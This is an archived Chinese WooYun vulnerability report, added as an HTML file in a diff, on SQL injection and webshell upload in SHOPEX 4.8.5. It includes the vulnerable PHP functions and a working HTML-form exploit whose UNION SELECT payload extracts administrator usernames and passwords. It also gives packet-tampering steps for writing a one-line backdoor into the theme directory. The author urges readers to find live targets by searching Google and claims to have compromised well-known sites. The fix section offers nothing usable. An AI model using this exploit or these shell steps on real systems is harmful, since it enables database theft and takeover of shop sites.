@@ -1,0 +1,264 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		SHOPEX 4.8.5 注入漏洞以及后台拿SHELL  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		SHOPEX 4.8.5 注入漏洞以及后台拿SHELL  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/fyouckoff">fyouckoff</a> 
+</li><li>提交时间：		2012-06-21 17:47</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-21：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-24：	细节向第三方安全合作伙伴开放<br/>
+									2012-07-01：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-07-11：	细节向普通白帽子公开<br/>
+									2012-07-31：	细节向实习白帽子公开<br/>
+									2012-08-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">SHOPEX 4.8.5 注入漏洞以及后台拿SHELL<br />
+shopex很久没有更新了啊亲，非得每次出漏洞了才更新一下下吗？<br />
+<br />
+wooyun提示：漏洞在上报乌云之前已经在外界披露，请紧急处理</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">SHOPEX 4.8.5 注入漏洞以及后台拿SHELL<br />
+<br />
+<br />
+<br />
+漏洞文件：<br />
+<br />
+漏洞核心函数 \core\model_v5\trading\mdl.goods.php<br />
+<br />
+漏洞代码：<br />
+<br />
+</p><pre><code>public function getProducts( $gid, $pid = 0 )<br />
+{<br />
+	$sqlWhere = &quot;&quot;;<br />
+	if ( 0 &lt; $pid )<br />
+	{<br />
+		$sqlWhere = &quot; AND A.product_id = &quot;.$pid; //www.lpboke.com 没过滤 ~~~~~~<br />
+	}<br />
+	$sql = &quot;SELECT A.*,B.image_default FROM sdb_products AS A LEFT JOIN sdb_goods AS B ON A.goods_id=B.goods_id WHERE A.goods_id=&quot;.intval( $gid ).$sqlWhere;<br />
+	return $this-&gt;db-&gt;select( $sql );<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+\core\shop\controller\ctl.product.php 文件调用<br />
+<br />
+</p><pre><code>function gnotify($goods_id=0,$product_id=0){<br />
+ <br />
+	if($_POST[&#039;goods&#039;][&#039;goods_id&#039;]){<br />
+		$goods_id = $_POST[&#039;goods&#039;][&#039;goods_id&#039;];<br />
+		$product_id = $_POST[&#039;goods&#039;][&#039;product_id&#039;];<br />
+	}<br />
+		$this-&gt;id =$goods_id;<br />
+	$objGoods = &amp;$this-&gt;system-&gt;loadModel(&#039;trading/goods&#039;);<br />
+	$aProduct = $objGoods-&gt;getProducts($goods_id, $product_id);//www.lpboke.com 直接带进去了<br />
+ <br />
+	$this-&gt;pagedata[&#039;goods&#039;] = $aProduct[0];<br />
+	if($this-&gt;member[member_id]){<br />
+		$objMember = &amp;$this-&gt;system-&gt;loadModel(&#039;member/member&#039;);<br />
+		$aMemInfo = $objMember-&gt;getFieldById($this-&gt;member[member_id], array(&#039;email&#039;));<br />
+		$this-&gt;pagedata[&#039;member&#039;] = $aMemInfo;<br />
+	}<br />
+ <br />
+	$this-&gt;output();<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+EXP: 保存为html使用即可<br />
+<br />
+</p><pre><code>&lt;html&gt; <br />
+&lt;head&gt; <br />
+&lt;title&gt;Shopex 4.8.5 SQL Injection Exp&lt;/title&gt; <br />
+&lt;/head&gt; <br />
+&lt;body&gt; <br />
+&lt;h2&gt;Shopex 4.8.5 SQL Injection Exp (product-gnotify)&lt;/h2&gt; <br />
+&lt;form action=&quot;http://www.xxoo.com/?product-gnotify&quot; method=&quot;post&quot; name=&quot;submit_url&quot;&gt; <br />
+    &lt;input type=&quot;hidden&quot; name=&quot;goods[goods_id]&quot; value=&quot;3&quot;&gt; <br />
+    &lt;input type=&quot;hidden&quot; name=&quot;goods[product_id]&quot; value=&quot;1 and 1=2 union select 1,2,3,4,5,6,7,8,concat(0x245E,username,0x2D3E,userpass,0x5E24),10,11,12,13,14,15,16,17,18,19,20,21,22 from sdb_operators&quot;&gt; <br />
+    &lt;input type=&quot;submit&quot; value=&quot;&quot;&gt; <br />
+&lt;/form&gt;<br />
+ <br />
+网址请修改:http://www.xxoo.com/?product-gnotify &lt;br /&gt;<br />
+本程序只能用于网站安全检测 &lt;br /&gt;<br />
+禁止用于非法途径,产生的一切后果与作者无关!&lt;br /&gt;<br />
+&lt;body&gt; <br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+拿shell方法….<br />
+<br />
+第一步 页面管理 修改模版 然后选一个XML编辑<br />
+<br />
+开始用 live http 抓包 你们懂的 然后把第一个POST包给抓出来<br />
+<br />
+然后改包 包要这么改 我研究了半天 尼玛的菊花红<br />
+<br />
+id=1273923028-info.xml&amp;tmpid=1273923028&amp;name=index_temp.php&amp;file_source=<br />
+<br />
+解释一下 id是你选择的模版文件夹名称 后面的info.xml 是你修改的XML文件 tmpid= 你们懂的 就是模版文件夹 然后 name 是你提交的文件名字 file_source 是后门或者shel<br />
+<br />
+我这里是一句话 你们懂的 然后提交了之后 地址是这样的http://Madman.in/themes/文件名称/你的木马名称<br />
+<br />
+<br />
+<br />
+随便google下“powered by shopex v4.8.5”，找个站测试一下<br />
+<br />
+</p><p class="detail"><a href="../images/21170648d71b9e0ebe400476c573f5bb9a9e410e.jpg" target="_blank"><img src="../images/21170648d71b9e0ebe400476c573f5bb9a9e410e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+另外测试了几个知名站点，也都中招，这里就不贴图了<br />
+<br />
+跟随电商潮而来的另一波脱裤潮要来了。。。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/21170648d71b9e0ebe400476c573f5bb9a9e410e.jpg" target="_blank"><img src="../images/21170648d71b9e0ebe400476c573f5bb9a9e410e.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">找程序猿吧 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/fyouckoff" title="fyouckoff">fyouckoff</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08597" title="SHOPEX 4.8.5 注入漏洞以及后台拿SHELL">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：1 </p>
+													<p class="detail">确认时间：2012-06-21 21:51</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您为信息安全做的贡献。<br />
+改漏洞已经过提交过或者已经公开处理过<br />
+非常感谢<br />
+</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8597";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
